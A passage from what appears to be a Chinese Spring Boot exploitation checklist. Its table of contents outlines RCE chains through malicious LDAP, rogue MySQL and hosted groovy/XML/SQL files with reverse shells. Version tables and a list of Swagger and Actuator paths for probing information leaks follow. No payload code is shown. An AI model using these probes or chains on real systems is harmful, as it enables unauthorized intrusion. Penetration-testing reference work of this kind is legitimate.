rmi 服务&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3-1&#34;&gt;步骤五：监听反弹 shell 的端口&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E5%85%AD%E5%8F%91%E9%80%81%E6%81%B6%E6%84%8F-payload&#34;&gt;步骤六：发送恶意 payload&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-4&#34;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4&#34;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-4&#34;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x06restart-h2-database-query-rce&#34;&gt;0x06：restart h2 database query RCE&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-9&#34;&gt;利用条件：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-9&#34;&gt;利用方法：&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%80%E8%AE%BE%E7%BD%AE-springdatasourcehikariconnection-test-query-%E5%B1%9E%E6%80%A7&#34;&gt;步骤一：设置 spring.datasource.hikari.connection-test-query 属性&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8&#34;&gt;步骤二：重启应用&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-5&#34;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5&#34;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-5&#34;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x07h2-database-console-jndi-rce&#34;&gt;0x07：h2 database console JNDI RCE&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-10&#34;&gt;利用条件：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-10&#34;&gt;利用方法：&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%80%E8%AE%BF%E9%97%AE%E8%B7%AF%E7%94%B1%E8%8E%B7%E5%BE%97-jsessionid&#34;&gt;步骤一：访问路由获得 jsessionid&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81-1&#34;&gt;步骤二：准备要执行的 Java 代码&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%89%E6%89%98%E7%AE%A1-class-%E6%96%87%E4%BB%B6-1&#34;&gt;步骤三：托管 class 文件&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1-1&#34;&gt;步骤四：架设恶意 ldap 服务&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3-2&#34;&gt;步骤五：监听反弹 shell 的端口&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E5%85%AD%E5%8F%91%E5%8C%85%E8%A7%A6%E5%8F%91-jndi-%E6%B3%A8%E5%85%A5&#34;&gt;步骤六：发包触发 JNDI 注入&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-6&#34;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-6&#34;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x08mysql-jdbc-deserialization-rce&#34;&gt;0x08：mysql jdbc deserialization RCE&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-11&#34;&gt;利用条件：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-11&#34;&gt;利用方法：&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E7%8E%AF%E5%A2%83%E4%BE%9D%E8%B5%96&#34;&gt;步骤一：查看环境依赖&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-rogue-mysql-server&#34;&gt;步骤二：架设恶意 rogue mysql server&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-springdatasourceurl-%E5%B1%9E%E6%80%A7&#34;&gt;步骤三：设置 spring.datasource.url 属性&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE-1&#34;&gt;步骤四：刷新配置&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%94%E8%A7%A6%E5%8F%91%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2&#34;&gt;步骤五：触发数据库查询&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E5%85%AD%E6%81%A2%E5%A4%8D%E6%AD%A3%E5%B8%B8-jdbc-url&#34;&gt;步骤六：恢复正常 jdbc url&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-6&#34;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-7&#34;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-7&#34;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x09restart-loggingconfig-logback-jndi-rce&#34;&gt;0x09：restart logging.config logback JNDI RCE&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-12&#34;&gt;利用条件：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-12&#34;&gt;利用方法：&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%98%E7%AE%A1-xml-%E6%96%87%E4%BB%B6&#34;&gt;步骤一：托管 xml 文件&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%98%E7%AE%A1%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1%E5%8F%8A%E4%BB%A3%E7%A0%81&#34;&gt;步骤二：托管恶意 ldap 服务及代码&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-loggingconfig-%E5%B1%9E%E6%80%A7&#34;&gt;步骤三：设置 logging.config 属性&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8&#34;&gt;步骤四：重启应用&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-7&#34;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-8&#34;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-8&#34;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x0arestart-loggingconfig-groovy-rce&#34;&gt;0x0A：restart logging.config groovy RCE&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-13&#34;&gt;利用条件：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-13&#34;&gt;利用方法：&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%98%E7%AE%A1-groovy-%E6%96%87%E4%BB%B6&#34;&gt;步骤一：托管 groovy 文件&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E8%AE%BE%E7%BD%AE-loggingconfig-%E5%B1%9E%E6%80%A7&#34;&gt;步骤二：设置 logging.config 属性&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%89%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8&#34;&gt;步骤三：重启应用&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-8&#34;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-9&#34;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x0brestart-springmainsources-groovy-rce&#34;&gt;0x0B：restart spring.main.sources groovy RCE&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-14&#34;&gt;利用条件：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-14&#34;&gt;利用方法：&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%98%E7%AE%A1-groovy-%E6%96%87%E4%BB%B6-1&#34;&gt;步骤一：托管 groovy 文件&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E8%AE%BE%E7%BD%AE-springmainsources-%E5%B1%9E%E6%80%A7&#34;&gt;步骤二：设置 spring.main.sources 属性&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%89%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8-1&#34;&gt;步骤三：重启应用&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-9&#34;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-10&#34;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x0crestart-springdatasourcedata-h2-database-rce&#34;&gt;0x0C：restart spring.datasource.data h2 database RCE&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-15&#34;&gt;利用条件：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-15&#34;&gt;利用方法：&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%98%E7%AE%A1-sql-%E6%96%87%E4%BB%B6&#34;&gt;步骤一：托管 sql 文件&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E8%AE%BE%E7%BD%AE-springdatasourcedata-%E5%B1%9E%E6%80%A7&#34;&gt;步骤二：设置 spring.datasource.data 属性&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%89%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8-2&#34;&gt;步骤三：重启应用&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-10&#34;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-11&#34;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;零：路由和版本&lt;/h2&gt; &#xA;&lt;h3&gt;0x01：路由知识&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;有些程序员会自定义 &lt;code&gt;/manage&lt;/code&gt;、&lt;code&gt;/management&lt;/code&gt; 、&lt;strong&gt;项目 App 相关名称&lt;/strong&gt;为 spring 根路径&lt;/li&gt; &#xA; &lt;li&gt;Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 &lt;code&gt;/&lt;/code&gt; ，2.x 版本则统一以 &lt;code&gt;/actuator&lt;/code&gt; 为起始路径&lt;/li&gt; &#xA; &lt;li&gt;Spring Boot Actuator 默认的内置路由名字，如 &lt;code&gt;/env&lt;/code&gt; 有时候也会被程序员修改，比如修改成 &lt;code&gt;/appenv&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;0x02：版本知识&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h4&gt;组件版本的相互依赖关系：&lt;/h4&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;依赖项&lt;/th&gt; &#xA;   &lt;th&gt;版本列表及依赖组件版本&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;spring-boot-starter-parent&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent&#34;&gt;spring-boot-starter-parent&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;spring-boot-dependencies&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies&#34;&gt;spring-boot-dependencies&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;spring-cloud-dependencies&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies&#34;&gt;spring-cloud-dependencies&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h4&gt;Spring Cloud 与 Spring Boot 版本之间的依赖关系：&lt;/h4&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Spring Cloud 大版本&lt;/th&gt; &#xA;   &lt;th&gt;Spring Boot 版本&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Angel&lt;/td&gt; &#xA;   &lt;td&gt;兼容 Spring Boot 1.2.x&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Brixton&lt;/td&gt; &#xA;   &lt;td&gt;兼容 Spring Boot 1.3.x、1.4.x&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Camden&lt;/td&gt; &#xA;   &lt;td&gt;兼容 Spring Boot 1.4.x、1.5.x&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Dalston&lt;/td&gt; &#xA;   &lt;td&gt;兼容 Spring Boot 1.5.x，不兼容 2.0.x&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Edgware&lt;/td&gt; &#xA;   &lt;td&gt;兼容 Spring Boot 1.5.x，不兼容 2.0.x&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Finchley&lt;/td&gt; &#xA;   &lt;td&gt;兼容 Spring Boot 2.0.x，不兼容 1.5.x&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Greenwich&lt;/td&gt; &#xA;   &lt;td&gt;兼容 Spring Boot 2.1.x&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Hoxton&lt;/td&gt; &#xA;   &lt;td&gt;兼容 Spring Boot 2.2.x&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h4&gt;Spring Cloud 小版本号的后缀及含义:&lt;/h4&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;小版本号后缀&lt;/th&gt; &#xA;   &lt;th&gt;含义&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;BUILD-SNAPSHOT&lt;/td&gt; &#xA;   &lt;td&gt;快照版，代码不是固定，处于变化之中&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;MX&lt;/td&gt; &#xA;   &lt;td&gt;里程碑版&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;RCX&lt;/td&gt; &#xA;   &lt;td&gt;候选发布版&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;RELEASE&lt;/td&gt; &#xA;   &lt;td&gt;正式发布版&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;SRX&lt;/td&gt; &#xA;   &lt;td&gt;(修复错误和 bug 并再次发布的)正式发布版&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;一：信息泄露&lt;/h2&gt; &#xA;&lt;h3&gt;0x01：路由地址及接口调用详情泄漏&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;直接访问以下两个 swagger 相关路由，验证漏洞是否存在：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;/v2/api-docs&#xA;/swagger-ui.html&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;其他一些可能会遇到的 swagger、swagger codegen、swagger-dubbo 等相关接口路由：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;/swagger&#xA;/api-docs&#xA;/api.html&#xA;/swagger-ui&#xA;/swagger/codes&#xA;/api/index.html&#xA;/api/v2/api-docs&#xA;/v2/swagger.json&#xA;/swagger-ui/html&#xA;/distv2/index.html&#xA;/swagger/index.html&#xA;/sw/swagger-ui.html&#xA;/api/swagger-ui.html&#xA;/static/swagger.json&#xA;/user/swagger-ui.html&#xA;/swagger-ui/index.html&#xA;/swagger-dubbo/api-docs&#xA;/template/swagger-ui.html&#xA;/swagger/static/index.html&#xA;/dubbo-provider/distv2/index.html&#xA;/spring-security-rest/api/swagger-ui.html&#xA;/spring-security-oauth-resource/swagger-ui.html&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;除此之外，下面的 spring boot actuator 